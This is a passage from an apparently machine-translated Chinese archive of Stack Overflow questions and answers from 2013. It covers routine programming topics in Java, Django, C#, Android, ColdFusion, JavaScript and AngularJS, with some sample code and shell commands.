 } catch (IOException e) { 
     // Handle exception
 } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T13:58:54.680

不确定Java是否真的有任何东西可以复制文件。最简单的方法是将文件转换为字节流，然后将此流写入另一个文件。像这样的东西：

```
 InputStream inStream = null;
        OutputStream outStream = null;

        File inputFile =new File("inputFile.txt");
        File outputFile =new File("outputFile.txt");

        inStream = new FileInputStream(inputFile);
        outStream = new FileOutputStream(outputFile);

        byte[] buffer = new byte[1024];

        int fileLength;
        while ((fileLength = inStream.read(buffer)) > 0){

              outStream.write(buffer, 0, fileLength );

              }

        inStream.close();
        outStream.close(); 
```

其中 inputFile 是从中复制的文件，而 outputFile 是副本的名称。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-12T14:30:21.587

我使用这段代码：

```
import java.io.*;

public class CopyTest {

    public CopyTest() {

    }

    public static void main(String[] args) {
        try {
            File stockInputFile = new File("C://test.txt");
            File StockOutputFile = new File("C://output.txt");

            FileInputStream fis = new FileInputStream(stockInputFile);
            FileOutputStream fos = new FileOutputStream(StockOutputFile);
            int count = 0;

            while((count = fis.read()) > -1){
                fos.write(count);
            }
            fis.close();
            fos.close();
        } catch (FileNotFoundException e) {
            System.err.println("FileStreamsReadnWrite: " + e);
        } catch (IOException e) {
            System.err.println("FileStreamsReadnWrite: " + e);
        }

   }

} 
```

# django - 如何仅使用 ModelForm 的表单验证？

> ID：15973069
> 
> 赞同：0
> 
> 时间：2013-04-12T13:49:05.970
> 
> 标签：django, python-2.7, django-1.4, django-forms

如何仅使用[ModelForm](https://docs.djangoproject.com/en/1.4/topics/forms/modelforms/)的表单验证？

请看我的代码！

模型.py

```
from django.db import models

class IPAddr(models.Model):
    ip = models.GenericIPAddressField(unique=True,)

class myModel(models.Model):
    ip = models.ForeignKey(IPAddr) 
```

表格.py

```
from django.forms import ModelForm
from django import forms
from app.models import *  # This is thing above models.py

class myModelForm(ModelForm):
    ip = forms.GenericIPAddressField()
    class Meta:
        model = myModel 
```

我想要下面的逻辑。

用户输入 ip（到 ip 字段）-> 验证 ->（form.is_valid 为 True）goodIP = IPAddr.objects.get_or_create(user_input_ip) -> myModel.objects.create(ip=goodIP)

但验证总是失败......

因为（例如）用户输入是“1.2.3.4”。如您所知，“1.2.3.4”是有效的 IP 地址。

但是 form.is_valid 是假的。因为 '1.2.3.4' 不是 IPAddr 实例。

所以我不能使用我想要的逻辑。

让我们看看[ModelForm 文档](https://docs.djangoproject.com/en/1.4/topics/forms/modelforms/#the-is-valid-method-and-errors)。

```
The first time you call is_valid() or access the errors attribute of a ModelForm triggers form validation as well as model validation. 
```

我只想验证表单验证...

...

我必须使用[表格](https://docs.djangoproject.com/en/1.4/ref/forms/)而不是 ModelForm ...吗？

在使用 ModelForm 时，我可以使用我想要的逻辑吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:05:25.113

```
class myModelForm(forms.ModelForm):
    ip = forms.GenericIPAddressField()

    class Meta:
        model = myModel

    def clean(self):
        cleaned_data = super(ContactForm, self).clean()
        ip = cleaned_data.get("ip")

        //do your login here

        return cleaned_data 
```

# c# - 按约束搜索字典值？（C＃）

> ID：15973070
> 
> 赞同：3
> 
> 时间：2013-04-12T13:49:07.867
> 
> 标签：c#, dictionary

我想知道是否可以查看字典中的元素以检查是否存在满足某些要求的元素。在我的例子中，我有一个`Dictionary<string, Rectangle>`和对于每个 Rectangle 值，我想使用`Contains`方法检查一个点是否包含在这个矩形内：（`genericRectangleValue.Contains(aPoint)`）。

即我想要一些功能，就像我可以说的列表一样：

```
 dictionaryList.Exists((delegate(KeyValuePair<string, Rectangle> kvp) { return kvp.Value.Contains(e.Location); }) 
```

...并且为了记录，是的，我已经考虑过使用`List<KeyValuePair<string, Rectangle>>`它，但是其他限制要求我使用 Dictionary 方法。

这对我来说不是一个关键问题，但是当你被困在使用字典时，有没有办法在不通过 foreach 循环的情况下做到这一点？

希望这对以后的其他人也有帮助，干杯！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-12T13:50:12.320

只需在字典`Where`的属性上使用 LINQ：`Values`

```
var rectsContainingLocation = dict.Values.Where(x => x.Contains(e.Location)); 
```

如果还需要对条件中的键求值，可以`Where`直接在字典上使用：

```
dict.Where(x => condition) 
```

不要忘记`using System.Linq;`在顶部添加。

# java - 如何在Android中的ListView项目之前放置一个数字

> ID：15973073
> 
> 赞同：0
> 
> 时间：2013-04-12T13:49:22.020
> 
> 标签：java, android, android-listview, android-arrayadapter

在我的列表中，数据显示如下，

```
test 1
test 2
test 3 
```

但我想向他们展示，

```
1) test 1
2) test 2
3) test 3 
```

我怎样才能做到这一点。请帮忙。这是我到目前为止所做的代码。

```
public class AppointmentList extends Activity{

    protected void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
        setContentView(R.layout.select_to_delete);

        String[] myStringArray = new String[] { "test 1", "test 2", "test 3"};

        ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, 
                android.R.layout.simple_list_item_1, myStringArray);

        ListView listView = (ListView) findViewById(R.id.listView1);
        listView.setAdapter(adapter);
    }

} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-12T14:05:56.823

您应该制作自己的自定义适配器类并实现其方法。. .

这是自定义适配器类的完整示例：

```
 private class Adapter extends BaseAdapter {
            private ArrayList<String> array;
            private Context ctx;

            public Adapter(Context ctx) {
                this.ctx = ctx;
                array = new ArrayList<String>();
            }

            @Override
            public int getCount() {
                return this.array.size();
            }

            @Override
            public Object getItem(int position) {
                return this.array.get(position);
            }

            @Override
            public long getItemId(int position) {
                return position;
            }

            /**
             * add a String Item in a List
             * 
             * @param item
             */
            public void addItem(String item) {
                this.array.add(item);
                this.notifyDataSetChanged();
            }

            /**
             * Delete an Item from a List
             * 
             * @param position
             */
            public void deleteItem(int position) {
                this.array.remove(position);
                this.notifyDataSetChanged();
            }

            @Override
            public View getView(int position, View convertView, ViewGroup parent) {
                View newView;

                if (convertView == null) {
                    newView = View.inflate(ctx, R.layout.item_layout, null);
                } else {
                    newView = convertView;
                }

                String txt = (String) this.getItem(position);

//   Here is what you're looking for:
                ((TextView) newView.findViewById(R.id.item_numb)).setText(""
                        + (position + 1) + ". ");
//   End;
                ((TextView) newView.findViewById(R.id.item_text)).setText(txt);

                return newView;
            }

        } 
```

之后您可以像这样使用适配器：

```
@Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_to_do_list);

        ListView ls = (ListView) findViewById(R.id.listView);
        Adapter adapter = new Adapter(this);
        ls.setAdapter(adapter);
    } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T14:05:59.553

您需要创建一个自定义项以按照您想要的方式从您的对象`ArrayAdapter`中填充一个。`ListView`

这种技术的优点是您获得了一种视图回收机制，该机制将回收`Views`您的内部`ListView`以减少内存消耗。

**简而言之**，您必须：

**1.**创建一个代表单行数据的对象。

**2.**创建`ArrayList`这些对象中的一个。

**3.**创建一个包含 ListView 的布局或使用代码将 ListView 添加到您的主布局。

**4.**创建单行布局。

**5.**创建一个`ViewHolder`从 的角度代表数据行的视觉方面`Views`。

**6.**创建一个自定义`ArrayAdapter`，将根据您的需要填充行，在其中您将覆盖该`getView`方法并使用`position`您收到的当前行的参数`View`来指示该行`index`。

**7.**最后把这个分配`ArrayAdapter`给你的`ListView`in `onCreate`。

通过阅读我写的这篇博文，您可以了解如何实现这一点：

[创建自定义 ArrayAdapter](http://blog-emildesign.rhcloud.com/?p=495)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-12T13:58:37.457

您将不得不创建一个自定义适配器并将`position+1`用作行中的数字

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-12T13:59:15.210

您可以尝试在列表中显示 html 内容

例如 ：

```
Html.fromHtml("<ol><li> test 1</li></ol>") 
```

[HTML 文档](https://developer.android.com/reference/android/text/Html.html#fromHtml(java.lang.String))

# android - 一键监听

> ID：15973074
> 
> 赞同：-1
> 
> 时间：2013-04-12T13:49:22.110
> 
> 标签：android

如何为动态创建的多个按钮创建单击侦听器？这是我的代码。

```
int cn = myary.length;
ScrollView sv = new ScrollView(this);
TableLayout ll = new TableLayout(this);
HorizontalScrollView hsv = new HorizontalScrollView(this);
TableRow tbrow0 = new TableRow(this);

    EditText tv0 = new EditText(this);
    tv0.setText("");
    tbrow0.addView(tv0);

    ll.addView(tbrow0);
    int j = 0;
    for (int i = 0; i < cn; i++) {
        TableRow tbrow = new TableRow(this);

        t1v = new Button(this);
        t1v.setText(myary[i]);
        t1v.setId(i+j);
        tbrow.addView(t1v);

        ll.addView(tbrow);
    }
    hsv.addView(ll);
    sv.addView(hsv);
    setContentView(sv); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T13:53:33.397

您可以创建一个实现 View.OnClickLister 的内部类，然后您可以将其设置为您的每个按钮：

让我们创建一个全局对象只是为了让@njzk2 开心：

```
private ClickListener mySingleListener = new ClickListener(); 
```

让我们为我们所有的按钮设置这个单一的监听器：

```
t1v = new Button(this);
t1v.setTag(i);
t1v.setOnClickListener(mySingleListener); 
```

你的 ClickListener 类是：

```
private class ClickListener implements View.OnClickListener {

    @Override
    public void onClick(View v) { 
         int position = (Integer) v.getTag(); 
         // Do click event here
    }

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T13:57:01.617

创建一个实现 View.OnClickListener 的类

```
class MyClickListener implements View.OnClickListener{

    @Override
    public void onClick(View v) {
        // put here what the click should do

    }

} 
```

然后将您班级中的对象附加到您的按钮上

```
btn.setOnClickListener(new MyClickListener()); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-12T13:53:41.883

例如，您在主布局中有 3 个按钮：

```
<LinearLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/my_switcher"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical">

<Button
        android:layout_width="100dp"
        android:layout_height="100dp"
        android:id="@+id/btn1"
        android:onClick="onClick"
        />
<Button
        android:layout_width="100dp"
        android:layout_height="100dp"
        android:id="@+id/btn2"
        android:onClick="onClick"
        />
<Button
        android:layout_width="100dp"
        android:layout_height="100dp"
        android:id="@+id/btn3"
        android:onClick="onClick"
        />

</LinearLayout> 
```

我您的活动方法是 onClick 处理来自三个按钮的事件。我们需要识别按钮已被按下。

```
 public void onClick(View view) { // Parameter 'view' used
    switch (view.getId())
    {
        case (R.id.btn1):
        {
            Toast.makeText(this, "Hello Button_1 pressed", Toast.LENGTH_LONG).show();
            break;
        }
        case (R.id.btn2):
        {
            Toast.makeText(this, "Hello Button_2 pressed", Toast.LENGTH_LONG).show();
            break;
        }
        case (R.id.btn3):
        {
            Toast.makeText(this, "Hello Button_2 pressed", Toast.LENGTH_LONG).show();
            break;
        }
    } 
```

这是如何使用“视图”的一个示例

# weblogic - 列出服务器上运行的所有 weblogic 实例的 UNIX 命令

> ID：15973077
> 
> 赞同：1
> 
> 时间：2013-04-12T13:49:27.627
> 
> 标签：weblogic

我想要当前在服务器上运行的所有 weblogic 实例的列表

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T13:54:58.003

> ps -ajx | grep java

或者

```
ps -elf | grep java 
```

这将使所有 java 进程运行，您可以从那里找出 weblogic 进程。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T13:51:39.580

您可以使用 ps 命令列出所有进程并适当地 grep 输出。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-30T11:24:55.020

ps -ef | grep java

显示进程状态和PID的空洞进程

杀死 -9 PID

它强行杀死特定进程

有时使用这个非常有用和重要的案例

谢谢

# c# - 使用静态类的 2 个单元测试 c# 之间的冲突

> ID：15973081
> 
> 赞同：3
> 
> 时间：2013-04-12T13:49:43.883
> 
> 标签：c#, unit-testing, conflict

我的一些单元测试之间存在冲突。我有一个带有静态事件的类，当我一次运行每个测试时我没有问题，但是当我批量运行所有测试时，触发事件的测试会因为注册的侦听器而崩溃（有在之前的测试中注册到事件）。

显然我不希望在测试类触发事件时执行事件处理程序，那么最好的解决方案是什么？

我知道如果事件不是静态的，我不会有问题，但如果有其他解决方案，我宁愿不必重新设计它。

在运行测试之前分离所有事件侦听器可能是一个解决方案，但我认为不可能从类外部进行（这似乎很正常，因为我们不希望客户端能够分离所有其他侦听器），并且从内部进行这意味着我必须在类中添加一个方法，仅用于单元测试，这是一种不好的做法。

有没有办法以隔离模式运行测试，以防止其他先前的测试对其产生影响？就像它是在一个完全独立的进程中运行的那样，这样我就不会得到对静态事件的相同引用？（但我仍然需要能够通过简单的点击批量执行所有测试）

感谢您的帮助和想法！

有关信息，我正在使用 Visual Studio 2012 单元测试框架。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-12T13:55:12.567

在每个单独的测试中的某个地方，您将把自己附加到静态事件中。因此，只需**在**断言之前简单地分离自己**或更好地**保护 finally 块中的分离：

```
[TestCase]
public void MyTestDetachingBeforeAssert()
{
    bool finishedCalled = false;
    var eventListener = new EventHandler((sender, e) => finishedCalled = true);

        MyClass.Finished += eventListener;
        // Can lead to detach problems if this throws an exception!
        MyClass.DoSomething();
        MyClass.Finished -= eventListener;

        Assert.That(finishedCalled);
}

[TestCase]
public void MyTestDetachingInFinally()
{
    bool finishedCalled = false;
    var eventListener = new EventHandler((sender, e) => finishedCalled = true);

    try
    {
        MyClass.Finished += eventListener;
        MyClass.DoSomething();

        Assert.That(finishedCalled);
    }
    finally
    {
        MyClass.Finished -= eventListener;
    }
} 
```

# coldfusion - CFStoredProc 超时

> ID：15973084
> 
> 赞同：1
> 
> 时间：2013-04-12T13:49:48.257
> 
> 标签：coldfusion, coldfusion-9, cfstoredproc

我有一个非常基本的应用程序，它将数据插入存储过程，然后返回一个记录集。我一直在经历我认为的“超时”。然而，我现在不再相信这就是真正发生的事情。原因是 DBA 和我观察了 sql server 的聚光灯，以查看存储过程何时完成处理。一旦该过程完成处理并返回一个记录集，ColdFusion 页面就会返回一个“超时”错误。每当程序花费一分钟以上时，我发现这是一致的。为了证明这一点，我创建了一个存储过程，仅此而已：

```
BEGIN

  WAITFOR DELAY '00:00:45';
  SELECT TOP 1000 * 
  FROM AnyTableName

END 
```

如果我运行它 59 秒，我会在 ColdFusion 中得到一个结果。如果我将其更改为一分钟：

```
WAITFOR DELAY '00:01'; 
```

我收到`cfstoredproc`超时错误。我尝试在同一服务器、不同数据库/数据源上的不同 ColdFusion 实例中运行它。现在，奇怪的是，我还有其他运行时间超过一分钟并返回结果的程序。我什至在我的桌面上使用 ColdFusion 10 进行了本地尝试，并得到了相同的结果。在这一点上，我没有地方可以看，所以我正在尝试其他事情。我还增加了数据源连接的超时时间，但这并没有帮助。我什至尝试了带有超时属性的 ColdFusion 10，但也没有运气。一致的是查询完成时显示超时错误。

另外，我尝试添加 WAITFOR`cfquery`并发生相同的结果。它在设置为 59 秒时有效，但在更改为一分钟时超时。我可以更改sql以选择top 1，结果没有区别。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T19:16:45.743

根据评论，您的请求超时似乎设置为 60 秒。

使用[cfsetting](http://livedocs.adobe.com/coldfusion/8/htmldocs/help.html?content=Tags_r-s_18.html)将超时时间延长到您需要的任何时间。

```
<cfsetting requesttimeout = "{numberOfSeconds}"> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-13T13:51:24.540

所有页面的默认超时时间为 60 秒，如果不够，您需要在 cfadmin 中更改此设置，但大多数页面不应运行这么长时间。花一些时间熟悉 cfadmin 及其所有设置，以避免这种头疼。如前所述，使用 cfsetting 标签覆盖特定页面。

# android - 为插件式功能启用广播接收器

> ID：15973086
> 
> 赞同：0
> 
> 时间：2013-04-12T13:49:52.447
> 
> 标签：android, broadcastreceiver

我正在尝试创建一个具有某些工厂基本功能的系统。

我希望第 3 方开发人员能够使用他们自己的代码扩展此功能。

这旨在通过在我希望 3rd 方应用程序接收它可以使用的数据的某些情况下触发广播来工作。

这个系统可以工作，但我遇到的问题是，从 3.1 版开始，应用程序需要由用户运行才能启用广播接收器。我希望我可以让这些插件在没有启动器/默认活动的情况下存在，这样用户就不需要用插件图标堵塞他们的启动器。将为设置定义额外的活动，但这将从我的应用程序生态系统中调用。

tl;dr：如何在新安装的应用程序中启用广播接收器，尽可能少的用户干预（理想情况下，不位于启动器中）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:13:10.743

AFAIK，Android 3.1+ 限制是隐式的`Intents`。显式`Intents`- 您设置`ComponentName`接收器的位置 - 应该可以正常工作。

所以，现在的问题变成了：你是如何真正与多个插件进行通信的？

如果您的意图是发送一个每个人都可以接收的广播，那将会遇到 Android 3.1 问题。您需要自己直接调用第三方应用程序中的某个组件来启用它，例如通过显式从您的 UI 启动其活动之一`Intent`，或通过显式直接向其组件之一发送广播`Intent`。

如果您的意图是专门向单个插件发送广播，那么您已经有了某种发现插件的方法（例如，监视添加的包并查找带有某些 . 的组件`<meta-data>`）。在这种情况下，您可以安排派生`Intent`要使用的显式（例如，它是带有 的组件`<meta-data>`）并且应该能够显式地向它广播。

如果您发现`Intents`由于 Android 3.1“停止状态”限制而导致显式不起作用，请告诉我，因为我想做更多调查。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:16:05.213

哦，我不知道这个新的安全功能。真倒霉……

但是现在我了解了问题的细节，我会建议一个答案，但不确定它是否会起作用，你必须自己测试它。

也许您可以在您的应用程序上接收[PACKAGE_ADDED 广播](http://developer.android.com/reference/android/content/Intent.html#ACTION_PACKAGE_ADDED)，在此接收器上，您将查询包管理器以获取此新添加的包并检查它是否具有用于您的广播的意图过滤器，如果有，那么您的应用程序应该显式启动该第 3 方应用程序的某些组件，因此可以通过 3.1 系统限制“初始化”。

这可能意味着您需要更改与 3rd 方开发人员的交互，以便他们拥有您的应用程序始终可以触发的标准组件，但这似乎是一种可行的解决方法。

# javascript - Javascript：setTimeout 和界面冻结

> ID：15973089
> 
> 赞同：9
> 
> 时间：2013-04-12T13:50:07.490
> 
> 标签：javascript, settimeout

## 语境

我有大约 10 个复杂的图表，每个需要 5 秒来刷新。如果我对这 10 个图表进行循环，刷新大约需要 50 秒。在这 50 秒内，用户可以移动滚动条。如果滚动条被移动，刷新必须停止，当滚动条停止移动时，刷新再次发生。

我在循环中使用 setTimeout 函数让界面刷新。算法是：

*   渲染第一张图
*   setTimeout(渲染第二张图，200)
*   渲染第二个图时，在 200 毫秒内渲染第三个图，依此类推

setTimeout 允许我们捕获滚动条事件并在下一次刷新时清除超时以避免在移动滚动条之前等待 50 秒...

问题是它不会随时运行。

使用下面的简单代码（您可以在这个小提琴中尝试：http: [//jsfiddle.net/BwNca/5/](http://jsfiddle.net/BwNca/5/)）：

HTML：

```
<div id="test" style="width: 300px;height:300px; background-color: red;">

</div>
<input type="text" id="value" />
<input type="text" id="value2" /> 
```

Javascript：

```
var i = 0;
var j = 0;
var timeout;
var clicked = false;

// simulate the scrollbar update : each time mouse move is equivalent to a scrollbar move
document.getElementById("test").onmousemove = function() {

    // ignore first move (because onclick send a mousemove event)
    if (clicked) {
        clicked = false;
        return;
    }

    document.getElementById("value").value = i++; 
    clearTimeout(timeout);
}

// a click simulates the drawing of the graphs
document.getElementById("test").onclick = function() {
    // ignore multiple click
    if (clicked) return;

    complexAlgorithm(1000);    
    clicked = true;   
}

// simulate a complexe algorithm which takes some time to execute (the graph drawing)
function complexAlgorithm(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) {
    if ((new Date().getTime() - start) > milliseconds){
      break;
    }
  }   

  document.getElementById("value2").value = j++;

  // launch the next graph drawing
  timeout =  setTimeout(function() {complexAlgorithm(1000);}, 1);
} 
```

代码确实：

*   当您将鼠标移入红色 div 时，它会更新一个计数器
*   当您单击红色 div 时，它会模拟 1 秒的大处理（因此由于 javascript 单线程，它会冻结界面）
*   冻结后等待1ms，重新模拟处理等直到鼠标再次移动
*   当鼠标再次移动时，它会打破超时以避免无限循环。

## 问题

当您单击一次并在冻结期间移动鼠标时，我在想当 setTimeout 发生时将执行的下一个代码是 mousemove 事件的代码（因此它会取消超时和冻结）但有时由于 mouvemove 事件，点击计数器获得 2 分或更多分，而不是仅获得 1 分...

该测试的结论：setTimeout 函数并不总是在 mousemove 事件期间释放资源来执行代码，但有时会在执行另一个代码之前保留线程并在 settimeout 回调中执行代码。

这样做的影响是，在我们的实际示例中，用户可以等待 10 秒（渲染 2 个图表）而不是在使用滚动条之前等待 5 秒。这很烦人，我们需要避免这种情况，并确保在渲染阶段移动滚动条时只渲染一个图形（而其他图形被取消）。

鼠标移动时如何确定超时？

PS：在下面的简单示例中，如果将超时更新为 200 毫秒，则一切运行正常，但这不是一个可接受的解决方案（真正的问题更复杂，问题发生在 200 毫秒的计时器和复杂的接口上）。请不要提供“优化图形渲染”的解决方案，这不是这里的问题。

编辑： cernunnos 对问题有更好的解释：此外，通过“阻止”循环中的进程，您可以确保在该循环完成之前无法处理任何事件，因此只会处理任何事件（并清除超时）每个循环的执行**（因此有时您必须等待 2 次或更多次完整执行才能中断）**。

问题恰好包含在粗体字中：我想确保在我想要的时候中断执行，而不是在中断之前等待 2 次或更多次完整执行

* * *

## 第二次编辑：

总之：采用这个jsfiddle： http: [//jsfiddle.net/BwNca/5/](http://jsfiddle.net/BwNca/5/)（上面的代码）。

更新此 jsfiddle 并提供解决方案：

鼠标在红色 div 上移动。然后单击并继续移动：右计数器必须只加一次。但有时它会在第一个计数器再次运行之前加注 2 或 3 次……这就是问题所在，它必须只加注一次！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T16:44:43.767

这里的大问题是 setTimeout 一旦开始就无法预测，尤其是当它执行一些繁重的任务时。

你可以在这里看到演示：http: [//jsfiddle.net/wao20/C9WBg/](http://jsfiddle.net/wao20/C9WBg/)

```
var secTmr = setTimeout(function(){
    $('#display').append('Timeout Cleared > ');
    clearTimeout(secTmr);        

    // this will always shown
    $('#display').append('I\'m still here! ');
}, 100); 
```

您可以做两件事来尽量减少对浏览器性能的影响。

**存储setTimeoutID的所有实例，当你想停止时循环遍历它**

```
var timers = []

// When start the worker thread
timers.push( setTimeout(function () { sleep(1000);}, 1) );

// When you try to clear 
while (timers.length > 0) {
     clearTimeout(timers.pop());
} 
```

**当您尝试停止进程时设置一个标志并检查工作线程内的该标志，以防 clearTimeout 无法停止计时器**

```
// Your flag 
var STOPForTheLoveOfGod = false;

// When you try to stop 
STOPForTheLoveOfGod = true; 
while (timers.length > 0) {       
     clearTimeout(timers.pop()); 
}

// Inside the for loop in the sleep function 
function sleep(milliseconds) {
    var start = new Date().getTime();
    for (var i = 0; i < 1e7; i++) {
        if (STOPForTheLoveOfGod) {
            break;
        }       

        // ...  
    }
} 
```

你可以试试这个新脚本。 [http://jsfiddle.net/wao20/7PPpS/4/](http://jsfiddle.net/wao20/7PPpS/4/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-17T01:10:52.097

令人惊讶的是，当您 setTimeout(); 时，您还没有想到这一点。之后您可以输入支票。一个变量为真然后丢弃等待，或者丢弃它。现在有一种方法可以让您检查是否使用滚动条进行滚动。在您使用该方法在变量中检查它是否为真之后，您会发现这将在滚动条时重复无限次，从而使许多执行时间为 5 秒。要解决此问题，请等待 1 秒以确保它不会过度重复。别客气 ：）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-21T19:09:09.807

你想要做的事情离不开 web worker，它只在一些最新的浏览器特别是 Chrome 中实现。

否则，你必须在队列中打破你的算法。就像 jQuery UI 将每个下一个动画计算放入队列中一样。[http://api.jquery.com/jQuery.queue/](http://api.jquery.com/jQuery.queue/)

这是一个简单的队列，下一个指令集在 setTimeout 的帮助下排队。

```
 for (i=0; i <1000; i++)
 {
     process (i) ;
 } 
```

可以翻译成

```
 function queue(s,n, f)
 {
    this.i=s;
    this.n=n;
    this.f=f;
    this.step = function(){
       if ( this.i <this.n)
       { 
            this.f(this.i);
            this.i = this.i +1;
            var t = this;
            setTimeout( function ( ) { t.step(); } , 5);
       }
    }
    this.step();

 }

 queue ( O, 1000, function(i){
     process(i);
 }) ; 
```

这只是一个示例，说明如何编写同步 for 循环以使用较小的独立迭代异步执行相同的逻辑。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-12T14:16:18.647

我可能已经理解了这个问题，但假设您在单击至少 1 秒后尝试阻止界面，并通过移动鼠标（至少 1 秒后）解除阻止：

这不是一个很好的睡眠实现，因为您一直在保持进程运行（什么都不做！= 睡眠），这会导致资源浪费。

为什么不创建一个覆盖（半/完全透明的 div），将其放在界面的其余部分（位置固定、全宽和全高）之上，并使用它来防止与底层界面的任何交互。然后在条件合适时销毁它（一秒钟过去了，用户移动了鼠标）。

这更像是一种睡眠（有一些初始处理时间，但随后释放处理器一段给定的时间），应该可以帮助您实现所需的行为（假设我理解正确）。

它还有一个额外的好处，就是允许您给用户一些视觉提示，表明正在进行某些处理。

编辑：此外，通过“阻塞”循环中的进程，您可以确保在该循环完成之前无法处理任何事件，因此任何事件只会在每个循环执行之间被处理（并清除超时）（因此为什么你有时必须等待 2 次或更多次完整执行才能中断）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-19T14:29:58.400

任何长时间运行的功能都会占用您的浏览器窗口。[考虑使用WebWorkers](https://developer.mozilla.org/en-US/docs/DOM/Using_web_workers)将您的 complexAlgorithm() 移出您的主要 JavaScript 代码。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-19T17:45:43.743

答案就在你的问题中

> ...刷新必须停止，当滚动条停止移动时，刷新再次发生。

您应该以这样的方式编写 complexAlgorithm 几乎可以立即在中间制动它（就在您知道必须重新运行时）

所以主代码应该看起来像

```
stopAllRefresh;  //should instantly(or after completing small chunk) stop refresh
setTimeout(startRefresh, 100); 
```

并在 setTimeout 中以小块（每个运行 < 1 秒）呈现图形，例如

```
var curentGraph = 0;
var curentChunk = 0;

function renderGraphChunk(){
    if (needToBreak)  //check if break rendering
    {exit};
// Render chunk here
    render(curentGraph, curentChunk);
    curentChunk +=1;

    setTimeout(renderGraphChunk, 1);
} 
```

这只是一个想法草图，实际实现可能完全不同

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-04-22T09:51:35.487

尝试检查网络工作者。我认为在这种情况下它会很有用。

1.  [http://en.wikipedia.org/wiki/Web_worker](http://en.wikipedia.org/wiki/Web_worker)

2.  [http://www.html5rocks.com/en/tutorials/workers/basics/](http://www.html5rocks.com/en/tutorials/workers/basics/)

# web-applications - 对数据库中收集的数据进行 A/B 测试

> ID：15973094
> 
> 赞同：0
> 
> 时间：2013-04-12T13:50:12.393
> 
> 标签：web-applications, web-statistics, abtest

假设我有一个带有`YES`和`NO`按钮的网站。现在，我记录了两天`YES`的点击次数和点击次数。`NO`

有了这些数据后，我想`A/B-test`对这些数据进行分析。所以，我将数据分成 50-50 份。使用一个作为控制数据，一个作为测试数据。对于测试数据，我计算 10 小时内（而不是两天）内点击是和否的次数。

你认为这是一个好方法`A/B-test`吗？据我所知，我需要两个功能略有不同的网站版本，而在我的情况下，所有用户的网站都是相同的，我只在假设的情况下拆分原始数据。如果不正确，请参考我的文章或网站。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T13:52:28.590

您需要两组用户相同（随机选择），因此最好并行运行这些组。

有关如何解释结果的更多信息，我强烈推荐这个博客： http: [//visualwebsiteoptimizer.com/split-testing-blog/](http://visualwebsiteoptimizer.com/split-testing-blog/)，尤其是“[你真正需要了解的关于 A/B 拆分测试的数学知识](http://visualwebsiteoptimizer.com/split-testing-blog/what-you-really-need-to-know-about-mathematics-of-ab-split-testing/)”和“[如何你的 A/B 测试样本量应该很大吗？](http://visualwebsiteoptimizer.com/split-testing-blog/how-to-calculate-ab-test-sample-size/) ”是必读的。

[这里](http://visualwebsiteoptimizer.com/split-testing-blog/ab-testing-significance-calculator-spreadsheet-in-excel/)还有一个很好的意义计算器。

# angularjs - ng-repeat不尊重=范围绑定的angularjs指令

> ID：15973095
> 
> 赞同：1
> 
> 时间：2013-04-12T13:50:26.493
> 
> 标签：angularjs, angularjs-directive

我创建了一个具有两个属性的隔离范围的指令。其中一个设置为使用等号进行数据绑定。如果我在 html 文档中多次手动插入指令，则对值的更改会如预期的那样反映在控制器的范围上。但是，如果我使用中继器 (ng-repeat) 插入元素，则与控制器上范围的连接将不再起作用。知道为什么吗？

该指令如下所示：

```
myApp.directive("phone", function(){
return{
    restrict: "E",
    scope:{
        number:"@",
        dirname:"="
    },
    template:  '<div class="panel"> <input type="text" ng-model="dirname"><br>Number:{{number}}  {{dirname}}</div> '

}

}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T15:18:02.390

我猜（因为你没有提供任何 HTML 或模型数据）你有一个目录名数组，所以在 ng-repeat 中，你试图将 ng-model 绑定到一个原语。由于 ng-repeat 的每次迭代都会创建自己的子范围，因此当您第一次输入文本框时，`dirname`将在子范围上创建一个原始属性。（这就是[JavaScript 原型继承](https://stackoverflow.com/questions/14049480/what-are-the-nuances-of-scope-prototypal-prototypical-inheritance-in-angularjs/14049482#14049482)的工作原理。）

解决方法是使用对象而不是原语。

```
$scope.names = [ {name: 'Superhero'}, {name: 'Julio'} ];

<li ng-repeat="nameObj in names">
   <phone number="123" dirname="nameObj.name"></phone>
</li> 
```

[小提琴](http://jsfiddle.net/mrajcok/fSkX3/)。

# json - 如何找到专辑 ID？

> ID：15973101
> 
> 赞同：0
> 
> 时间：2013-04-12T13:50:40.150
> 
